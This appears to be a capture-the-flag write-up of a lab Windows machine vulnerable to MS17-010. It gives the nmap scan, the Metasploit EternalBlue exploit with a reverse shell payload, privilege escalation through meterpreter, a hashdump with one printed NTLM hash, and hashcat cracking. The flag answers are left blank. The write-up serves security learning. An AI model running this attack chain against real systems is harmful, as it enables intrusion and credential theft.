## Recon

<details>
<summary> How many ports are open with a port number under 1000? </summary>
  <p></p>

____________________________________________________________________________________________________________________  
  
As we are specifying only ports under 1000 we use the following command:
  
``` nmap [ip] -p 0-1000 ```

As seen below, running this command exposes 3 open ports:
  
![image](https://user-images.githubusercontent.com/66912443/186659494-ca27127c-ef59-4279-8c78-4a66e22f1cd9.png)

____________________________________________________________________________________________________________________  
  
</details>

<details>
<summary> What is this machine vulnerable to? </summary>
<p></p>

____________________________________________________________________________________________________________________ 

The script "vuln" is a CVE detection script that helps discover vulnerabilities in the scanned network. It can be activated with the following command:
  
``` nmap [ip] --script vuln ```
  
As seen below it has identified the machine is vulnerable to "ms17-010"
  
![image](https://user-images.githubusercontent.com/66912443/186661668-94728fae-8558-4642-81a8-3cb717ee4798.png)

____________________________________________________________________________________________________________________  
</details>

## Gain Access

<details>
<summary> Find the exploitation code we will run against the machine. What is the full path of the code? </summary>
  <p></p>
  
____________________________________________________________________________________________________________________ 
  
Rapid7 is a great tool for finding vulnerabilities and their uses along with sometimes instructions on how to complete the exploit yourself. Using rapid7.com's Vulnerability and Exploit Database, this vulnerability can be seen in more detail:
  
``` https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/ ```
  
Talking about instructions on how to complete the exploit yourself, at the bottom of the page the first line of code identifies the exploitation code needed to run against the machine!
  
![image](https://user-images.githubusercontent.com/66912443/186663495-0312c1af-22e4-4549-bfbf-563dda2f2670.png)

____________________________________________________________________________________________________________________  
</details>

<details>
<summary> Show options and set the one required value. What is the name of this value? </summary>
  <p></p>

____________________________________________________________________________________________________________________   
``` RHOSTS ``` is the one required value. This is because RHOSTS determines the ip address of the target.

____________________________________________________________________________________________________________________   
  
</details>

<details>
<summary> With that done, run the exploit! </summary>
 
____________________________________________________________________________________________________________________ 

Before running the exploit, make sure to run the following command as by default it will load meterpreter and a follow up question requires converting shell to meterpreter shell.
  
``` set payload windows/x64/shell/reverse_tcp ```
  
Then simply type 'run' and let metaspolit do its thing! If done correctly you will be presented with something similar to the following:
  
![image](https://user-images.githubusercontent.com/66912443/186665440-c9ede66d-7bc3-4245-b47e-a56ceec67727.png)

  
____________________________________________________________________________________________________________________ 

</details>

## Escalate

<details>
<summary> Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? </summary>
  
____________________________________________________________________________________________________________________

Thanks to a post by 'Binamra Pandey' I have learnt the command to convert a shell is as follows: 
   
``` post/multi/manage/shell_to_meterpreter ```
  
<p></p>
  
Source = https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646  
____________________________________________________________________________________________________________________  
</details>

<details>
<summary> Select this (use MODULE_PATH). Show options, what option are we required to change? </summary>
  
____________________________________________________________________________________________________________________ 

``` SESSION ``` is the required option as we need to know which session (that has been backgrounded) to run this exploit on. In my example 'session 2' was backgrounded. 
  
To list all sessions use ``` sessions -l ```
  
![image](https://user-images.githubusercontent.com/66912443/186669104-9eca0c90-a0e7-453b-953b-3fc117fda793.png)


____________________________________________________________________________________________________________________   
  
</details>

<details>
<summary> Run! If this doesn't work, try completing the exploit from the previous task once more. </summary>

____________________________________________________________________________________________________________________ 

  <p></p>
  Running the exploit should lead you to see similar to this below. As seen in the text it says 'Meterpreter session 3 opened'. So the next step would be to navigate to it using the command:
<p></p>  
  
``` sessions 3 ```

  <p></p>  
  
![image](https://user-images.githubusercontent.com/66912443/186669699-49fc84fc-7b7a-49bf-b5e7-6d29bfba8a0b.png)
  
  ____________________________________________________________________________________________________________________ 

</details>

<details>
<summary> Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. </summary>

____________________________________________________________________________________________________________________ 
  
  <p></p>
  Running 'getsytem':
  <p></p>
  
  ![image](https://user-images.githubusercontent.com/66912443/186670379-144fb6db-c4a8-48e7-8121-2c1bb294e465.png)
  
  Opening a dos shell and running whoami:
  
  ![image](https://user-images.githubusercontent.com/66912443/186670738-df061830-ee4b-4a00-a779-2d34e8402ddd.png)

____________________________________________________________________________________________________________________ 
  
</details>

<details>
<summary> List all of the processes running via the 'ps' command. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id </summary>

____________________________________________________________________________________________________________________ 
  
  <p></p>
  As seen in the cropped screenshot below, powershell.exe as well as many others are running at 'NT AUTHORITY/SYSTEM'. For simplicities sake I will stick with powershell, process ID 3056.
  <p></p>
  
![image](https://user-images.githubusercontent.com/66912443/186671522-82c4c813-c4f0-492d-a3d6-346b435e3657.png)
____________________________________________________________________________________________________________________   

</details>

<details>
<summary> Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. </summary>

____________________________________________________________________________________________________________________ 
  
  <p></p>
This is as simple as the following command:
  
```migrate 3056 ```
  
This is useful as now we are running on a process that has system authority!
  
![image](https://user-images.githubusercontent.com/66912443/186671912-1726b9c4-7c78-41c4-934b-3772421e6a6b.png)

____________________________________________________________________________________________________________________   

</details>

## Cracking

<details>
<summary> Within our elevated meterpreter shell, run the command 'hashdump'. What is the name of the non-default user? </summary>

____________________________________________________________________________________________________________________ 

  <p></p>
  The name of the non-default user is <i> jon </i>
  <p></p>
  
  ![image](https://user-images.githubusercontent.com/66912443/186672534-d803dffa-6966-49a6-8fff-7cb3614836bf.png)

____________________________________________________________________________________________________________________   
</details>

<details>
<summary> Copy this password hash to a file and research how to crack it. What is the cracked password? </summary>

  ____________________________________________________________________________________________________________________ 
  
  <p></p>
  This is the hashdump we will be working with:
  <p></p>
  
``` Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: ```

Windows uses NTLM to authenticate a client on an Active-Directory domain. When it comes to cracking the passwords this is what we will need to select in hashcat. Looking at hashcat's hash mode table we know that NTLM uses hash mode 1000:
  
![image](https://user-images.githubusercontent.com/66912443/186678368-1512a206-2470-4e42-a1f9-22d083e375ae.png)

  
To make the hash easier to work with, I have first copied the hash and put it into a file called 'hash.txt' in the root directory.
  
![image](https://user-images.githubusercontent.com/66912443/186675515-4466972d-a3f0-401f-8c8f-e940ce9b1f96.png)

Next, we will use hashcat to crack the hashes, this includes the hash mode type talked about above:
  
``` hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt ```
  
After letting it run long enough you will have your cracked hash!
  
![image](https://user-images.githubusercontent.com/66912443/186678699-75c0b403-b9b2-477e-9c0f-f43e03e4925c.png)

____________________________________________________________________________________________________________________ 

</details>

## Find Flags!

<details>
<summary> Flag1? This flag can be found at the system root. </summary>

Any folded content here. It requires an empty line just above it.

</details>

<details>
<summary> Flag2? This flag can be found at the location where passwords are stored within Windows. </summary>

Any folded content here. It requires an empty line just above it.

</details>

<details>
<summary> flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. </summary>

Any folded content here. It requires an empty line just above it.

</details>

